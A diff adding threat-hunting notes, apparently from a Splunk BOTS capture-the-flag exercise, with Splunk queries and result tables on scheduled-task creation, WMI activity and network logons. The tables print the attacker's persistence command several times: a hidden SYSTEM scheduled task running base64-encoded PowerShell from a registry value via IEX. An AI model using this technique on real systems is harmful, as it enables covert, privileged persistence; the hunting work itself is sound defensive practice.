@@ -165,6 +165,43 @@ Subject:
 
 
 
+## a
+### index="botsv*" "*schtasks.exe" "*/Create *" | stats count by Security_ID,ComputerName,Process_Command_Line
+| Security_ID | ComputerName | Process_Command_Line | count |
+| :--- | :--- | :--- | :--- |
+| NT AUTHORITY\SYSTEM | wrk-ghoppy.frothly.local | schtasks.exe /Create /tn "Microsoft\Office\Office Automatic Updates" /XML "C:\Program Files\Common Files\Microsoft Shared\ClickToRun\OfficeUpdateSchedule.xml" | 900 |
+| NT AUTHORITY\SYSTEM | wrk-btun.frothly.local | schtasks.exe /Create /tn "Microsoft\Office\Office Automatic Updates" /XML "C:\Program Files\Common Files\Microsoft Shared\ClickToRun\OfficeUpdateSchedule.xml" | 869 |
+| NT AUTHORITY\SYSTEM | wrk-ghoppy.frothly.local | schtasks.exe /Create /tn "Microsoft\Office\Office ClickToRun Service Monitor" /XML "C:\Program Files\Common Files\Microsoft Shared\ClickToRun\ServiceWatcherSchedule.xml" | 466 |
+| NT AUTHORITY\SYSTEM | wrk-bgist.frothly.local | schtasks.exe /Create /tn "Microsoft\Office\Office Automatic Updates" /XML "C:\Program Files\Common Files\Microsoft Shared\ClickToRun\OfficeUpdateSchedule.xml" | 435 |
+| NT AUTHORITY\SYSTEM | wrk-abungst.frothly.local | schtasks.exe /Create /tn "Microsoft\Office\Office Automatic Updates" /XML "C:\Program Files\Common Files\Microsoft Shared\ClickToRun\OfficeUpdateSchedule.xml" | 403 |
+| NT AUTHORITY\SYSTEM | wrk-fmaltes.frothly.local | schtasks.exe /Create /tn "Microsoft\Office\Office Automatic Updates" /XML "C:\Program Files\Common Files\Microsoft Shared\ClickToRun\OfficeUpdateSchedule.xml" | 403 |
+| NT AUTHORITY\SYSTEM | wrk-aturing.frothly.local | schtasks.exe /Create /tn "Microsoft\Office\Office Automatic Updates" /XML "C:\Program Files\Common Files\Microsoft Shared\ClickToRun\OfficeUpdateSchedule.xml" | 344 |
+| NT AUTHORITY\SYSTEM | wrk-aturing.frothly.local | schtasks.exe /Create /tn "Microsoft\Office\Office ClickToRun Service Monitor" /XML "C:\Program Files\Common Files\Microsoft Shared\ClickToRun\ServiceWatcherSchedule.xml" | 3 |
+| AzureAD\FyodorMalteskesko | FYODOR-L.froth.ly | "C:\Windows\system32\schtasks.exe" /Create /F /RU system /SC DAILY /ST 18:45 /TN Updater /TR "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -NonI -W hidden -c \"IEX ([Text.Encoding]::UNICODE.GetString([Convert]::FromBase64String((gp HKLM:\Software\Microsoft\Network debug).debug)))\"" | 1 |
+| FROTHLY\billy.tun | wrk-btun.frothly.local | "C:\Windows\system32\schtasks.exe"  /Create /F /RU system /SC DAILY /ST 10:26 /TN Updater /TR "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -NonI -W hidden -c \"IEX ([Text.Encoding]::UNICODE.GetString([Convert]::FromBase64String((gp HKLM:\Software\Microsoft\Network debug).debug)))\"" | 1 |
+| FROTHLY\service3 | venus.frothly.local | "C:\Windows\system32\schtasks.exe"  /Create /F /RU system /SC DAILY /ST 10:51 /TN Updater /TR "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -NonI -W hidden -c \"IEX ([Text.Encoding]::UNICODE.GetString([Convert]::FromBase64String((gp HKLM:\Software\Microsoft\Network debug).debug)))\"" | 1 |
+| FROTHLY\service3 | wrk-klagerf.frothly.local | "C:\Windows\system32\schtasks.exe"  /Create /F /RU system /SC DAILY /ST 10:39 /TN Updater /TR "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -NonI -W hidden -c \"IEX ([Text.Encoding]::UNICODE.GetString([Convert]::FromBase64String((gp HKLM:\Software\Microsoft\Network debug).debug)))\"" | 1 |
+| NULL SID | FYODOR-L.froth.ly | "C:\Windows\system32\schtasks.exe" /Create /F /RU system /SC DAILY /ST 18:45 /TN Updater /TR "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -NonI -W hidden -c \"IEX ([Text.Encoding]::UNICODE.GetString([Convert]::FromBase64String((gp HKLM:\Software\Microsoft\Network debug).debug)))\"" | 1 |
+
+### index="botsv*" "wmiprvse*" | stats count by Security_ID
+| Security_ID | count |
+| :--- | :--- |
+| NT AUTHORITY\SYSTEM | 2685 |
+| NT AUTHORITY\NETWORK SERVICE | 405 |
+| NULL SID | 14 |
+| AzureAD\FyodorMalteskesko | 4 |
+
+### 
+index="botsv*" EventCode=4624 Logon_Type=3 ComputerName IN ("*klagerf*", "*btun*" , "*FYODOR-L*" , "*venus*")
+| rename ComputerName as dest_host
+| rename src_nt_host as src_host
+| stats count by src_host,dest_host
+| eval from=src_host, to=dest_host
+| fields from, to, count
+
+
+
+
 ## service3
 ### index="botsv*" EventCode=4672 | top limit=100 Security_ID
 | Security_ID                     | count  | percent   |
